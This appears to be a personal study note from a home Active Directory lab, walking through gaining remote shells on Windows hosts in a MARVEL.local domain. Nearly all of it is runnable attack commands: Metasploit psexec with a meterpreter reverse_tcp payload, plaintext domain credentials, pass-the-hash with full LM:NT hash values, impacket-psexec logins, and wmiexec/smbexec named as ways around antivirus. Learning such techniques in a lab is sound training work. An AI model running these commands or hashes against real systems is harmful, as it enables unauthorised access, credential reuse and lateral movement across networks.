# Metasploit Way
- `use exploit/windows/smb/psexec`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set rhosts 10.0.1.9`
- `set smbdomain MARVEL.local`
- `set smbuser fcastle`
- `set smbpass Password1`
- ![[Pasted image 20250328161905.png]]
- `run` to get the shell:
	- ![[Pasted image 20250328162408.png]]
- Using `hash`:
	- `set smbuser administrator` => Can use pparker too, but something different
	- `unset smbdomain` => Not required as hash already have this
	- `set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f` => **==First part is LM and second part is NT==**
		- ![[Pasted image 20250328162751.png]]
		- `run` to get a shell 


# Using `impacket-psexec`:
- `impacket-psexec MARVEL.local/\fcastle:'Password1'@10.0.1.9` => need to escape forward slash
	- ![[Pasted image 20250328164340.png]]
- `impacket-psexec pparker@10.0.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16` => on .10 as hashes are of **Spiderman** machine
![[Pasted image 20250328170147.png]]

# Alternatives for psexec:
---
- `wmiexec.py`, `smbexec.y` -> for antivirus or other machine problems


# Problems
---
- Not able to login as `Administrator` as we added these accounts ourselves, might have missed some key detail:
	- ![[Pasted image 20250328170331.png]]